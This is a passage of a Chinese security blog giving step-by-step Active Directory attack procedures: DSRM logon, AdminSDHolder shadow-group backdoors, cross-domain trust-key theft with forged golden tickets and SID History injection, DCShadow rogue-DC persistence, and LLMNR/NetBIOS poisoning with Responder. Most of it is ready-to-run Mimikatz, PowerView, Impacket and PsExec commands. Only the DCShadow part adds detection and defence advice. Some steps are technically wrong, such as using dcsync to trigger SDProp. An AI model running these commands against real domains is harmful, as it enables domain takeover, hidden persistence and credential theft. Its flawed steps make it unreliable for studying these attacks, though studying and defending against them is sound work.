<h4 id="4-持久化利用"><a href="#4-持久化利用" class="headerlink" title="4. 持久化利用"></a><strong>4. 持久化利用</strong></h4><ul>
<li><strong>通过 DSRM 登录域控</strong>：<br>使用修改后的密码本地登录，执行高权限操作（如启动 Mimikatz 提取哈希）：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 PsExec 远程登录（需本地管理员权限）</span></span><br><span class="line">PsExec.exe \\DC01 -u Administrator -p NewPassw0rd! cmd.exe</span><br></pre></td></tr></table></figure></li>
<li><strong>部署隐蔽后门</strong>：<br>结合 <strong>计划任务</strong> 或 <strong>WMI 事件订阅</strong>，在系统启动时重新激活 DSRM 权限。</li>
</ul>
<hr>
<h2 id="6-AdminSDHolder与影子组"><a href="#6-AdminSDHolder与影子组" class="headerlink" title="6.AdminSDHolder与影子组"></a>6.AdminSDHolder与影子组</h2><hr>
<h3 id="一、AdminSDHolder的核心原理"><a href="#一、AdminSDHolder的核心原理" class="headerlink" title="一、AdminSDHolder的核心原理"></a><strong>一、AdminSDHolder的核心原理</strong></h3><p><strong>AdminSDHolder</strong> 是 Active Directory 中的一个特殊容器（位于 <code>CN=AdminSDHolder,CN=System,DC=example,DC=com</code>），其 ACL（访问控制列表）会被定期同步到所有受保护的高权限组（如 <strong>Domain Admins</strong>、<strong>Enterprise Admins</strong>）和用户，确保其权限不被意外篡改。同步由 <strong>SDProp（Security Descriptor Propagator）</strong> 进程完成，默认每 <strong>60 分钟</strong> 执行一次。</p>
<h3 id="二、影子组的定义与作用"><a href="#二、影子组的定义与作用" class="headerlink" title="二、影子组的定义与作用"></a><strong>二、影子组的定义与作用</strong></h3><p><strong>影子组</strong> 是攻击者创建或利用的普通用户组，通过修改 <strong>AdminSDHolder 的 ACL</strong>，将影子组添加到其权限列表中，从而间接控制所有受保护的高权限组。影子组本身不具备特权，但其权限会通过 SDProp 同步到所有受保护对象，实现隐蔽的权限维持。</p>
<hr>
<h3 id="三、攻击流程详解"><a href="#三、攻击流程详解" class="headerlink" title="三、攻击流程详解"></a><strong>三、攻击流程详解</strong></h3><h4 id="步骤-1：创建影子组"><a href="#步骤-1：创建影子组" class="headerlink" title="步骤 1：创建影子组"></a><strong>步骤 1：创建影子组</strong></h4><p>创建一个看似无害的用户组（如 “IT_Support”），用于隐藏攻击意图：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-ADGroup</span> <span class="literal">-Name</span> <span class="string">&quot;IT_Support&quot;</span> <span class="literal">-GroupScope</span> Global <span class="literal">-GroupCategory</span> Security</span><br><span class="line"><span class="built_in">Add-ADGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;IT_Support&quot;</span> <span class="literal">-Members</span> AttackerUser</span><br></pre></td></tr></table></figure>

<h4 id="步骤-2：修改AdminSDHolder的ACL"><a href="#步骤-2：修改AdminSDHolder的ACL" class="headerlink" title="步骤 2：修改AdminSDHolder的ACL"></a><strong>步骤 2：修改AdminSDHolder的ACL</strong></h4><p>使用 <strong>PowerView</strong> 或 <strong>Active Directory模块</strong> 授予影子组对 AdminSDHolder 的完全控制权限：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 PowerView</span></span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">Add-ObjectAcl</span> <span class="literal">-TargetDistinguishedName</span> <span class="string">&quot;CN=AdminSDHolder,CN=System,DC=example,DC=com&quot;</span> <span class="literal">-PrincipalIdentity</span> IT_Support <span class="literal">-Rights</span> All</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 AD 模块（需RSAT）</span></span><br><span class="line"><span class="variable">$acl</span> = <span class="built_in">Get-ACL</span> <span class="string">&quot;AD:CN=AdminSDHolder,CN=System,DC=example,DC=com&quot;</span></span><br><span class="line"><span class="variable">$sid</span> = (<span class="built_in">Get-ADGroup</span> IT_Support).SID</span><br><span class="line"><span class="variable">$acl</span>.AddAccessRule((<span class="built_in">New-Object</span> System.DirectoryServices.ActiveDirectoryAccessRule <span class="variable">$sid</span>, <span class="string">&quot;GenericAll&quot;</span>, <span class="string">&quot;Allow&quot;</span>))</span><br><span class="line"><span class="built_in">Set-ACL</span> <span class="literal">-Path</span> <span class="string">&quot;AD:CN=AdminSDHolder,CN=System,DC=example,DC=com&quot;</span> <span class="literal">-AclObject</span> <span class="variable">$acl</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤-3：触发SDProp同步"><a href="#步骤-3：触发SDProp同步" class="headerlink" title="步骤 3：触发SDProp同步"></a><strong>步骤 3：触发SDProp同步</strong></h4><p>默认每60分钟自动同步，也可手动触发（需域控重启或强制同步）：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 重启域控（高风险）</span><br><span class="line">shutdown /r /t <span class="number">0</span></span><br><span class="line"></span><br><span class="line"># 使用 Mimikatz 强制触发（需SYSTEM权限）</span><br><span class="line">mimikatz &quot;lsadump::dcsync /<span class="built_in">path</span>:CN=AdminSDHolder,CN=System,DC=example,DC=com&quot;</span><br></pre></td></tr></table></figure>

<h4 id="步骤-4：通过影子组行使特权"><a href="#步骤-4：通过影子组行使特权" class="headerlink" title="步骤 4：通过影子组行使特权"></a><strong>步骤 4：通过影子组行使特权</strong></h4><p>影子组成员（如 AttackerUser）可修改受保护组的成员（如添加自己到 Domain Admins）：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-ADGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Domain Admins&quot;</span> <span class="literal">-Members</span> AttackerUser</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="四、技术原理深度解析-2"><a href="#四、技术原理深度解析-2" class="headerlink" title="四、技术原理深度解析"></a><strong>四、技术原理深度解析</strong></h3><ol>
<li><p><strong>AdminSDHolder的ACL同步机制</strong><br>SDProp 进程将 AdminSDHolder 的 ACL 复制到所有受保护对象（标记为 <code>adminCount=1</code> 的对象），覆盖其原有权限。攻击者通过控制 AdminSDHolder 的 ACL，间接控制所有高权限组。</p>
</li>
<li><p><strong>隐蔽性设计</strong>  </p>
<ul>
<li><strong>影子组低权限</strong>：影子组本身不直接拥有特权，避免被常规审计工具（如 BloodHound）标记为高危。  </li>
<li><strong>权限继承延迟</strong>：SDProp 同步周期为60分钟，攻击痕迹不会立即暴露。</li>
</ul>
</li>
<li><p><strong>防御绕过</strong>  </p>
<ul>
<li>修改 AdminSDHolder 的 ACL 无需域管理员权限，只需对容器有写权限（默认 Domain Admins 拥有此权限）。  </li>
<li>攻击者可结合 ACL 隐藏技术（如禁用继承），使权限变更难以通过 GUI 工具发现。</li>
</ul>
</li>
</ol>
<hr>
<h1 id="十、交叉信任攻击"><a href="#十、交叉信任攻击" class="headerlink" title="十、交叉信任攻击"></a>十、交叉信任攻击</h1><hr>
<h2 id="一、交叉信任攻击的核心原理"><a href="#一、交叉信任攻击的核心原理" class="headerlink" title="一、交叉信任攻击的核心原理"></a><strong>一、交叉信任攻击的核心原理</strong></h2><p><strong>交叉信任（Cross-Trust）攻击</strong> 是攻击者利用 Active Directory 多域环境中的 <strong>信任关系</strong>（如父子信任、林信任、外部信任），通过一个被攻陷的域（<strong>Source Domain</strong>）向另一个受信任的域（<strong>Target Domain</strong>）横向移动，最终控制整个林或外部域。其核心逻辑如下：</p>
<ul>
<li><strong>信任密钥（Trust Key）</strong>：域间信任关系通过共享密钥（NTLM Hash 或 AES Key）建立，攻击者可窃取该密钥伪造跨域票据。</li>
<li><strong>SID History 滥用</strong>：通过注入目标域特权组的 SID，绕过权限验证。</li>
<li><strong>跨域资源访问</strong>：利用信任关系访问目标域的资源（如文件共享、数据库）。</li>
</ul>
<hr>
<h2 id="二、攻击前提条件-2"><a href="#二、攻击前提条件-2" class="headerlink" title="二、攻击前提条件"></a><strong>二、攻击前提条件</strong></h2><ol>
<li><strong>环境要求</strong>：<ul>
<li>存在跨域信任关系（如 <code>DomainA</code> 信任 <code>DomainB</code>）。</li>
<li>攻击者已控制源域的域控制器或高权限账户。</li>
</ul>
</li>
<li><strong>关键凭据</strong>：<ul>
<li><strong>信任密钥</strong>（通过 DCSync 或注册表提取）。</li>
<li><strong>目标域的 SID</strong>（用于构造黄金票据或 SID History）。</li>
</ul>
</li>
</ol>
<hr>
<h2 id="三、攻击流程与手法"><a href="#三、攻击流程与手法" class="headerlink" title="三、攻击流程与手法"></a><strong>三、攻击流程与手法</strong></h2><h3 id="1-提取信任密钥"><a href="#1-提取信任密钥" class="headerlink" title="1. 提取信任密钥"></a><strong>1. 提取信任密钥</strong></h3><ul>
<li><strong>通过 DCSync 导出</strong>（需源域控权限）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Mimikatz 提取域间信任密钥</span></span><br><span class="line">mimikatz <span class="string">&quot;lsadump::trust /patch&quot;</span></span><br><span class="line"><span class="comment"># 或使用 Impacket</span></span><br><span class="line">secretsdump.py domainA/administrator@dc.domainA.com -just-dc-user domainB$</span><br></pre></td></tr></table></figure></li>
<li><strong>从注册表导出</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line">python3 secretsdump.py -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-伪造跨域黄金票据"><a href="#2-伪造跨域黄金票据" class="headerlink" title="2. 伪造跨域黄金票据"></a><strong>2. 伪造跨域黄金票据</strong></h3><p>​	若已获取域间信任密钥（Trust Key），可伪造跨域黄金票据（Golden Ticket），直接获得目标域权限，无需依赖SID History。</p>
<p>​	使用信任密钥生成针对目标域的黄金票据：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Mimikatz（假设目标域为 DomainB）</span></span><br><span class="line">mimikatz <span class="string">&quot;kerberos::golden /user:Administrator /domain:DomainB.com /sid:S-1-5-21-... /sids:S-1-5-21-&lt;DomainB Admins Group&gt; /krbtgt:&lt;TrustKey&gt; /ptt&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>关键参数</strong>：<ul>
<li><code>/sids</code>：注入目标域特权组的 SID（如 Domain Admins）。</li>
<li><code>/krbtgt</code>：信任密钥（非目标域的 krbtgt Hash）。</li>
</ul>
</li>
</ul>
<h3 id="3-跨域资源访问"><a href="#3-跨域资源访问" class="headerlink" title="3. 跨域资源访问"></a><strong>3. 跨域资源访问</strong></h3><ul>
<li><strong>访问目标域文件共享</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\dc.domainB.com\C$</span><br></pre></td></tr></table></figure></li>
<li><strong>执行 DCSync 攻击</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;lsadump::dcsync /domain:DomainB.com /user:krbtgt&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>横向移动至目标域主机</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py DomainB.com/Administrator@workstation.domainB.com -hashes &lt;NTLM_Hash&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4-SID-History-注入（跨域提权）"><a href="#4-SID-History-注入（跨域提权）" class="headerlink" title="4. SID History 注入（跨域提权）"></a><strong>4. SID History 注入（跨域提权）</strong></h3><p>​	攻击者在<strong>源域</strong>（已控）中创建用户，并注入<strong>目标域</strong>（受信任域）的高权限组SID（如Domain Admins的SID）。当该用户访问目标域资源时，系统会将其SID History视为有效权限来源，授予对应特权。</p>
<h5 id="步骤1：获取源域控制权"><a href="#步骤1：获取源域控制权" class="headerlink" title="步骤1：获取源域控制权"></a><strong>步骤1：获取源域控制权</strong></h5><ul>
<li>前提：已控源域的域控制器或具备<strong>Domain Admin</strong>权限。</li>
<li>目标：修改用户属性以注入SID History。</li>
</ul>
<h5 id="步骤2：确定目标域高权限SID"><a href="#步骤2：确定目标域高权限SID" class="headerlink" title="步骤2：确定目标域高权限SID"></a><strong>步骤2：确定目标域高权限SID</strong></h5><ul>
<li><p>获取目标域的<strong>Domain Admins组SID</strong>（如<code>S-1-5-21-&lt;域标识&gt;-512</code>）。</p>
</li>
<li><p>工具示例（PowerView）：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainGroup</span> <span class="literal">-Identity</span> <span class="string">&quot;Domain Admins&quot;</span> <span class="literal">-Domain</span> tar<span class="built_in">get-domain</span>.com | <span class="built_in">Select-Object</span> SID</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="步骤3：注入SID-History"><a href="#步骤3：注入SID-History" class="headerlink" title="步骤3：注入SID History"></a><strong>步骤3：注入SID History</strong></h5><ul>
<li><p>使用<strong>Mimikatz</strong>或<strong>PowerShell</strong>修改用户属性：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Mimikatz（需SYSTEM权限）</span></span><br><span class="line">mimikatz <span class="string">&quot;sid::add /sam:EvilUser /new:S-1-5-21-&lt;目标域标识&gt;-512&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PowerShell（需AD模块）</span></span><br><span class="line"><span class="built_in">Set-ADUser</span> <span class="literal">-Identity</span> EvilUser <span class="operator">-Replace</span> <span class="selector-tag">@</span>&#123;sidHistory=(<span class="string">&quot;S-1-5-21-&lt;目标域标识&gt;-512&quot;</span>)&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="步骤4：跨域访问与提权"><a href="#步骤4：跨域访问与提权" class="headerlink" title="步骤4：跨域访问与提权"></a><strong>步骤4：跨域访问与提权</strong></h5><ul>
<li><p>使用注入SID的用户访问目标域资源：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">runas /user:source-domain\EvilUser cmd.exe</span><br><span class="line"><span class="built_in">dir</span> \\dc.target-domain.com\C$  <span class="comment"># 验证权限</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>执行DCSync导出目标域哈希：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;lsadump::dcsync /domain:target-domain.com /user:krbtgt&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="四、信任类型与攻击影响"><a href="#四、信任类型与攻击影响" class="headerlink" title="四、信任类型与攻击影响"></a><strong>四、信任类型与攻击影响</strong></h2><table>
<thead>
<tr>
<th><strong>信任类型</strong></th>
<th><strong>攻击可行性</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>父子信任</strong></td>
<td>高（默认双向可传递，可访问整个林资源）</td>
</tr>
<tr>
<td><strong>林信任</strong></td>
<td>中（需明确配置资源访问权限）</td>
</tr>
<tr>
<td><strong>外部信任</strong></td>
<td>低（单向不可传递，仅限特定域）</td>
</tr>
<tr>
<td><strong>领域信任</strong></td>
<td>低（与非 Windows 域交互，如 Kerberos 领域）</td>
</tr>
</tbody></table>
<h1 id="十一、森林权限持久化DCShadow"><a href="#十一、森林权限持久化DCShadow" class="headerlink" title="十一、森林权限持久化DCShadow"></a>十一、森林权限持久化DCShadow</h1><hr>
<h2 id="一、DCShadow攻击原理"><a href="#一、DCShadow攻击原理" class="headerlink" title="一、DCShadow攻击原理"></a><strong>一、DCShadow攻击原理</strong></h2><p><strong>DCShadow</strong> 是一种基于 <strong>Active Directory 复制机制</strong> 的高级权限维持技术，允许攻击者通过注册 <strong>恶意域控制器（Rogue DC）</strong>，绕过常规权限验证直接修改 AD 数据库（<code>ntds.dit</code>），实现隐蔽的持久化。其核心特点如下：</p>
<ul>
<li><strong>无需物理接触真实DC</strong>：通过伪造DC身份，利用合法的DrsReplicaAdd协议同步恶意数据。</li>
<li><strong>绕过日志监控</strong>：操作模拟正常域复制行为，不触发敏感事件日志（如对象修改记录）。</li>
<li><strong>高权限需求</strong>：需 <strong>Domain Admin</strong> 或 <strong>Enterprise Admin</strong> 权限注册恶意DC。</li>
</ul>
<hr>
<h2 id="二、攻击流程-1"><a href="#二、攻击流程-1" class="headerlink" title="二、攻击流程"></a><strong>二、攻击流程</strong></h2><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a><strong>1. 环境准备</strong></h3><ul>
<li><strong>权限提升</strong>：获取域管理员权限（如通过Mimikatz提取哈希或Pass-the-Ticket）。</li>
<li><strong>工具准备</strong>：使用Mimikatz的 <strong>DCShadow模块</strong> 或PowerShell脚本（如 <strong>Invoke-DCShadow</strong>）。</li>
</ul>
<h3 id="2-注册恶意域控制器"><a href="#2-注册恶意域控制器" class="headerlink" title="2. 注册恶意域控制器"></a><strong>2. 注册恶意域控制器</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用Mimikatz注册恶意DC（需SYSTEM权限）</span></span><br><span class="line">mimikatz <span class="string">&quot;lsadump::dcshadow /object:CN=Users,DC=example,DC=com /attribute:primaryGroupID /value:512&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>参数说明</strong>：<ul>
<li><code>/object</code>：目标AD对象（如用户、组）。</li>
<li><code>/attribute</code>：要修改的属性（如<code>primaryGroupID</code>设置为Domain Admins的RID 512）。</li>
<li><code>/value</code>：新属性值。</li>
</ul>
</li>
</ul>
<h3 id="3-篡改AD对象"><a href="#3-篡改AD对象" class="headerlink" title="3. 篡改AD对象"></a><strong>3. 篡改AD对象</strong></h3><ul>
<li><strong>提权用户</strong>：将普通用户加入特权组（如Domain Admins）。</li>
<li><strong>部署后门</strong>：修改AdminSDHolder的ACL或配置恶意组策略。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;lsadump::dcshadow /push&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4-触发复制与清理"><a href="#4-触发复制与清理" class="headerlink" title="4. 触发复制与清理"></a><strong>4. 触发复制与清理</strong></h3><ul>
<li><strong>强制同步</strong>：触发合法DC从恶意DC拉取数据。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;lsadump::dcshadow /execute&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>删除痕迹</strong>：卸载恶意DC注册信息，避免被逆向追踪。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;lsadump::dcshadow /cleanup&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="三、技术优势与隐蔽性"><a href="#三、技术优势与隐蔽性" class="headerlink" title="三、技术优势与隐蔽性"></a><strong>三、技术优势与隐蔽性</strong></h2><ol>
<li><strong>绕过传统检测</strong>：<ul>
<li><strong>无日志记录</strong>：AD对象修改操作不生成Event ID 5136（对象属性变更）。</li>
<li><strong>合法协议滥用</strong>：利用DRS（Directory Replication Service）协议，流量加密且与正常复制行为相似。</li>
</ul>
</li>
<li><strong>持久化效果</strong>：<ul>
<li><strong>直接修改数据库</strong>：更改写入<code>ntds.dit</code>，重启后仍有效。</li>
<li><strong>无文件落地</strong>：操作全程在内存中完成，不触发文件监控。</li>
</ul>
</li>
</ol>
<hr>
<h2 id="四、攻击场景示例"><a href="#四、攻击场景示例" class="headerlink" title="四、攻击场景示例"></a><strong>四、攻击场景示例</strong></h2><h3 id="场景1：隐蔽提权"><a href="#场景1：隐蔽提权" class="headerlink" title="场景1：隐蔽提权"></a><strong>场景1：隐蔽提权</strong></h3><ol>
<li>攻击者控制用户<code>UserA</code>，将其<code>primaryGroupID</code>改为<code>512</code>（Domain Admins组RID）。</li>
<li>通过DCShadow推送修改，UserA获得域管理员权限。</li>
<li>合法DC同步后，UserA可访问所有域资源。</li>
</ol>
<h3 id="场景2：ACL后门"><a href="#场景2：ACL后门" class="headerlink" title="场景2：ACL后门"></a><strong>场景2：ACL后门</strong></h3><ol>
<li>修改<code>AdminSDHolder</code>的ACL，添加影子组<code>BackdoorGroup</code>的完全控制权限。</li>
<li>所有受保护组（如Domain Admins）的ACL被同步更新，影子组成员获得持久控制权。</li>
</ol>
<hr>
<h2 id="五、检测与防御"><a href="#五、检测与防御" class="headerlink" title="五、检测与防御"></a><strong>五、检测与防御</strong></h2><h3 id="1-检测方法"><a href="#1-检测方法" class="headerlink" title="1. 检测方法"></a><strong>1. 检测方法</strong></h3><ul>
<li><strong>网络流量分析</strong>：<ul>
<li>监控异常的 <strong>DRS远程过程调用（RPC）</strong> 请求，尤其是来自非DC主机的流量。</li>
<li>使用Wireshark过滤<code>dcerpc.cn</code>协议，检查<code>DrsReplicaAdd</code>调用来源。</li>
</ul>
</li>
<li><strong>日志监控</strong>：<ul>
<li><strong>Event ID 4662</strong>：关注<code>DS-Replication-Get-Changes-All</code>操作的来源IP。</li>
<li><strong>Event ID 4742</strong>：检查新注册的域控制器（恶意DC通常无正常SPN）。</li>
</ul>
</li>
<li><strong>工具扫描</strong>：<ul>
<li><strong>ADExplorer</strong>：手动检查域控制器列表中的异常条目。</li>
<li><strong>BloodHound</strong>：识别异常的ACL修改或用户权限提升路径。</li>
</ul>
</li>
</ul>
<h3 id="2-防御措施"><a href="#2-防御措施" class="headerlink" title="2. 防御措施"></a><strong>2. 防御措施</strong></h3><ul>
<li><strong>权限最小化</strong>：<ul>
<li>限制 <strong>Domain Admins</strong> 组权限，避免账户被滥用。</li>
<li>禁用不必要的域控制器注册权限（默认允许Domain Admins）。</li>
</ul>
</li>
<li><strong>网络隔离</strong>：<ul>
<li>限制域控制器间的RPC通信（端口135、445、636）仅允许可信IP。</li>
<li>启用SMB签名与LDAPS加密，防止中间人攻击。</li>
</ul>
</li>
<li><strong>增强监控</strong>：<ul>
<li>配置SIEM工具（如Splunk）实时告警异常DRS事件。</li>
<li>定期审计AD对象的属性变更（如<code>primaryGroupID</code>、<code>sidHistory</code>）。</li>
</ul>
</li>
<li><strong>补丁与加固</strong>：<ul>
<li>安装AD复制的安全更新（如KB5008380）。</li>
<li>启用 <strong>LSA保护（Credential Guard）</strong> 防止凭据窃取。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="六、清除后门"><a href="#六、清除后门" class="headerlink" title="六、清除后门"></a><strong>六、清除后门</strong></h2><ol>
<li><strong>回滚AD修改</strong>：<ul>
<li>使用合法域控制器强制同步正确配置。</li>
<li>手动修复被篡改的AD对象属性。</li>
</ul>
</li>
<li><strong>移除恶意DC</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用ntdsutil删除恶意DC</span></span><br><span class="line">ntdsutil <span class="string">&quot;metadata cleanup&quot;</span> <span class="string">&quot;connections&quot;</span> <span class="string">&quot;connect to server legit-dc&quot;</span> <span class="string">&quot;quit&quot;</span> <span class="string">&quot;select operation target&quot;</span> <span class="string">&quot;list domains&quot;</span> <span class="string">&quot;select domain 0&quot;</span> <span class="string">&quot;list sites&quot;</span> <span class="string">&quot;select site 0&quot;</span> <span class="string">&quot;list servers&quot;</span> <span class="string">&quot;select server &lt;恶意DC编号&gt;&quot;</span> <span class="string">&quot;quit&quot;</span> <span class="string">&quot;remove selected server&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>审计与恢复</strong>：<ul>
<li>重置受影响用户的凭据与组成员关系。</li>
<li>验证AdminSDHolder与系统容器的ACL配置。</li>
</ul>
</li>
</ol>
<hr>
<h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a><strong>七、总结</strong></h2><p>DCShadow利用Active Directory的复制机制，实现了极难检测的持久化攻击。其隐蔽性源于对合法协议的滥用与无日志特性，防御需结合网络隔离、权限控制与深度行为分析。对于企业安全团队而言，持续监控域控制器间的异常通信、严格管理高权限账户，是抵御此类高级威胁的关键。</p>
<h1 id="十二、其他补充知识点"><a href="#十二、其他补充知识点" class="headerlink" title="十二、其他补充知识点"></a>十二、其他补充知识点</h1><h2 id="一-利用协议降级进行NTLM嗅探"><a href="#一-利用协议降级进行NTLM嗅探" class="headerlink" title="一.利用协议降级进行NTLM嗅探"></a>一.利用协议降级进行NTLM嗅探</h2><p>针对通过 <strong>DNS降级、LLMNR&#x2F;NetBIOS投毒</strong> 结合 <strong>NTLM哈希嗅探</strong> 的攻击方式，以下是技术原理、攻击流程及防御方案：</p>
<hr>
<h3 id="1-攻击原理：名称解析协议的弱点"><a href="#1-攻击原理：名称解析协议的弱点" class="headerlink" title="1. 攻击原理：名称解析协议的弱点"></a><strong>1. 攻击原理：名称解析协议的弱点</strong></h3><h4 id="1-名称解析协议降级"><a href="#1-名称解析协议降级" class="headerlink" title="(1) 名称解析协议降级"></a><strong>(1) 名称解析协议降级</strong></h4><ul>
<li><strong>DNS解析失败后的备用机制</strong>：当客户端通过DNS无法解析目标主机名时，会自动回退到 <strong>LLMNR</strong>（链路本地多播名称解析，IPv6）或 <strong>NetBIOS-NS</strong>（IPv4）进行本地网络广播查询。</li>
<li><strong>攻击者利用点</strong>：攻击者监听并伪造响应，声称自己是目标主机，诱导客户端向攻击者发起认证请求（如SMB、HTTP等），从而获取NTLM哈希。</li>
</ul>
<h4 id="2-本地链路多播（Link-Local-Multicast）"><a href="#2-本地链路多播（Link-Local-Multicast）" class="headerlink" title="(2) 本地链路多播（Link-Local Multicast）"></a><strong>(2) 本地链路多播（Link-Local Multicast）</strong></h4><ul>
<li><strong>LLMNR</strong>：使用多播地址 <code>FF02::1:3</code>（IPv6）或 <code>224.0.0.252</code>（IPv4），在本地子网内广播查询。</li>
<li><strong>NetBIOS-NS</strong>：通过UDP 137端口广播查询（IPv4）。</li>
<li><strong>无认证机制</strong>：这些协议未验证响应者身份，攻击者可轻易伪造响应。</li>
</ul>
<hr>
<h3 id="2-攻击流程"><a href="#2-攻击流程" class="headerlink" title="2. 攻击流程"></a><strong>2. 攻击流程</strong></h3><h4 id="步骤1：诱骗客户端发起认证"><a href="#步骤1：诱骗客户端发起认证" class="headerlink" title="步骤1：诱骗客户端发起认证"></a><strong>步骤1：诱骗客户端发起认证</strong></h4><ol>
<li>用户或服务尝试访问一个不存在的共享路径（如误输 <code>\\fileserver\share</code>）。</li>
<li>DNS解析失败后，客户端通过LLMNR&#x2F;NetBIOS广播查询 <code>fileserver</code>。</li>
<li>攻击者（如使用 <strong>Responder</strong> 工具）抢先响应，声明自己是 <code>fileserver</code>。</li>
</ol>
<h4 id="步骤2：触发NTLM认证"><a href="#步骤2：触发NTLM认证" class="headerlink" title="步骤2：触发NTLM认证"></a><strong>步骤2：触发NTLM认证</strong></h4><ul>
<li>客户端向攻击者伪装的服务器发起SMB、HTTP或FTP等协议连接。</li>
<li>攻击者发送认证挑战（Challenge），客户端计算NTLM响应（包含用户密码的哈希）并返回。</li>
</ul>
<h4 id="步骤3：捕获NTLM哈希"><a href="#步骤3：捕获NTLM哈希" class="headerlink" title="步骤3：捕获NTLM哈希"></a><strong>步骤3：捕获NTLM哈希</strong></h4><ul>
<li>攻击者捕获客户端的NTLM响应（如 <code>NTLMv2-Hash</code>），后续可通过离线暴力破解或中继攻击（Relay）利用该哈希。</li>
</ul>
<hr>
<h3 id="3-常用工具"><a href="#3-常用工具" class="headerlink" title="3. 常用工具"></a><strong>3. 常用工具</strong></h3><ul>
<li><strong>Responder</strong>：自动化监听LLMNR&#x2F;NetBIOS&#x2F;MDNS请求并伪造响应，捕获NTLM哈希。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Responder.py -I eth0</span><br></pre></td></tr></table></figure></li>
<li><strong>Inveigh</strong>（Windows PowerShell）：类似Responder，支持更多协议。</li>
<li><strong>mitm6</strong>：利用IPv6 DHCP投毒，强制客户端使用攻击者控制的DNS服务器。</li>
</ul>
<hr>
